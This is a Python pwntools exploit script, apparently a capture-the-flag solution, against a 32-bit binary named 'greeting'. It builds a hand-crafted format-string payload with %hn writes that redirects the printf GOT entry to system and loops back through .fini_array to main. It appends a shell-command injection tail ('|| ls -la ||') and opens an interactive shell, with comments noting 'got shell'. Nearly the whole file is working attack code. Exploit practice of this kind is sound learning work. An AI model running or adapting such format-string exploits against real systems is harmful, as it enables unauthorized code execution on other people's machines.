#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *

context.clear(arch='i386')
exe = context.binary = ELF('greeting')
context.terminal = ["gnome-terminal", "-e"] # debug only


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
set follow-fork-mode parent
break *0x{exe.symbols.main:x}
break *0x804864f
continue
set follow-fork-mode child
'''.format(**locals())

# -- Exploit goes here --

fini_array = 0x8049934
printf_GOT = 0x8049A38
main = 0x80485ED
system_PLT = 0x8048496
already_written = "Nice to meet you, "
writes = {
        fini_array: main,
        printf_GOT: system_PLT
    }

io = start()

# 2 bytes of padding + payload
#payload = "AA" + fmtstr_payload(12, writes, write_size='short')

def expl(payload):
    log.info("Sending {}".format(repr(payload)))
    io.sendline(payload + "\n test || ls -la || (")

format_string = FmtStr(execute_fmt=expl, offset=12, padlen=2, numbwritten=len(already_written))
for k in writes:
    format_string.write(k, writes[k])
#format_string.execute_writes()

# got shell
# automated string exploit does not fucking works

out = "  \x3a\x9a\x04\x08\x38\x9a\x04\x08\x36\x99\x04\x08\x34\x99\x04\x08"
# out += "%12$hn"
# out += "%14$hn"
out += "%2016x" # pad %n value to 0804
out += "%12$hn" # write 0x804 to printf@PLT
out += "%14$hn" # write 0x804 to fini_array
out += "%31890x" # pad %n value to 8496
out += "%13$hn" # write the rest of printf@PLT
out += "%343x"  # pad %n value to 85ED
out += "%15$hn"
out += "\n || ls -la || ("
io.sendline(out)

#io.sendline("pp" + p32(0xdeadbeef) + " %12$x")

io.interactive()

